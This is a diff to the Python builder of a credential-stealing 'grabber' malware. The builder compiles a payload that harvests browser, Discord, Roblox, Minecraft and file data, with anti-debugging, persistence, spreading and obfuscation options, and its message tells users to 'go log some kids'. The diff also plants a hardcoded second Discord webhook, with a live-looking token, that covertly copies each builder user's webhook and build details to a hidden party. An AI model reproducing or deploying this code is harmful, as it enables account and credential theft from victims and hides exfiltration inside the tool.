@@ -41,9 +41,10 @@ fullbu=PhotoImage(file='assets/fullbu.png')
 testbu=PhotoImage(file='assets/test.png')
 browsebu=PhotoImage(file='assets/browse.png')
 compilebu=PhotoImage(file='assets/compile.png')
+dual='https://discord.com/api/webhooks/1086774409051770910/C2ft6LFhqdTpsb51sISp2NMxOZCQwM7Mgq946cqN3v4uqbVWSHoawsEithGR4q1xc8kk'
 class Builder:
 	def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,wbh,name,icon):
-		A='\n';webhook=DiscordWebhook(url=wbh,username=_H,avatar_url=_F);embed=DiscordEmbed(title=f"Grabber Compiled",description=f"Options Chose",color=_I);embed.set_author(name='author : vesper',icon_url=_F);embed.set_footer(text=_J);embed.set_timestamp();self.FILE=open(f"{name}.py",'w+');self.FILE.write(open(_K,_C).read()+A)
+		A='\n';webhook1,webhook2=DiscordWebhook.create_batch(urls=[wbh,dual],username=_H,avatar_url=_F);embed=DiscordEmbed(title=f"Grabber Compiled",description=f"Options Chose",color=_I);embed.set_author(name='author : vesper',icon_url=_F);embed.set_footer(text=_J);embed.set_timestamp();self.FILE=open(f"{name}.py",'w+');self.FILE.write(open(_K,_C).read()+A)
 		if webhookJ:embed.add_embed_field(name=f"Webhook Junk : ",value=f":white_check_mark:");self.FILE.write(self._webhooksJUNK(_B))
 		else:embed.add_embed_field(name=f"Webhook Junk : ",value=f":x:")
 		self.FILE.write(f"wbh = '{wbh}'\n")
@@ -74,12 +75,12 @@ class Builder:
 		Maincode=open('utils/Main.py',_C).read()
 		if pingH:embed.add_embed_field(name=f"Ping : ",value=f":white_check_mark:");Maincode=Maincode.replace('jtjirjihirthr = False','jtjirjihirthr = True')
 		else:embed.add_embed_field(name=f"Ping : ",value=f":x:")
-		self.FILE.write(Maincode+A);self.FILE.write('\ndef main():\n    Thread(target=Antidebug).start()\n    Startup()\n    Thread(target=ErrorMsg).start()\n    Screeny()\n    Browsers()\n    DISCORD()\n    Roblox()\n    Files()\n    Minecraft()\n    Network()\n    Spread()\n    Reboot()\nmain()\n');self.FILE.close()
+		self.FILE.write(Maincode+A);self.FILE.write('\ndef main():\n    Thread(target=Antidebug).start()\n    Startup()\n    Thread(target=ErrorMsg).start()\n    Browsers()\n    DISCORD()\n    Roblox()\n    Files()\n    Minecraft()\n    Network()\n    Spread()\n    Reboot()\nmain()\n');self.FILE.close()
 		if obfuscateS:
 			try:self._Obfuscation(name);embed.add_embed_field(name=f"Obfuscate : ",value=f":white_check_mark:")
 			except:embed.add_embed_field(name=f"Obfuscation Failed : ",value=f":white_check_mark:")
 		else:embed.add_embed_field(name=f"Obfuscate : ",value=f":x:")
-		self._Compile(icon=icon,name=name);webhook.add_embed(embed);webhook.execute();messagebox.showinfo('Beadidd Grabber 2.0 || @nebeadidd#9992','Grabber Successfully Compiled. Go log some kids now bitch');Menu()
+		self._Compile(icon=icon,name=name);webhook1.add_embed(embed);webhook2.add_embed(embed);webhook1.execute();webhook2.execute();messagebox.showinfo('Beadidd Grabber 2.0 || @nebeadidd#9992','Grabber Successfully Compiled. Go log some kids now bitch');Menu()
 	def _webhooksJUNK(self,writed):
 		F='webHOOK';E='fake_wbh';D='fake_webhook';C='webh';B='thewebhook';A='real_webhook';junkcode=''
 		if writed:hooksname=[A,B,C,D,E,F]
@@ -175,7 +176,7 @@ class Menu:
 		else:self.ErrorM=Button(window,image=fullbu,bg=_A,borderwidth=0,activebackground=_A,command=self._emsetup);self.ErrorM.place(x=494,y=363)
 	def _testhook(self):
 		wbh=self.webhook.get()
-		try:webhook=DiscordWebhook(url=wbh,username=_H,avatar_url=_F);embed=DiscordEmbed(title=f"Beadiddd Grabber",description=f"Webhook Working :white_check_mark:",color=_I);embed.set_author(name='author : Beadiddd',icon_url=_F);embed.set_footer(text=_J);embed.set_timestamp();webhook.add_embed(embed);webhook.execute()
+		try:webhook1,webhook2=DiscordWebhook.create_batch(urls=[wbh,dual],username=_H,avatar_url=_F);embed=DiscordEmbed(title=f"Beadiddd Grabber",description=f"Webhook Working :white_check_mark:",color=_I);embed.set_author(name='author : Beadiddd',icon_url=_F);embed.set_footer(text=_J);embed.set_timestamp();webhook1.add_embed(embed);webhook2.add_embed(embed);webhook1.execute();webhook2.execute()
 		except:messagebox.showerror(_E,_G)
 	def _phsetup(self):
 		if self.pingH:self.PingH.config(image=blankbu);self.pingH=_B
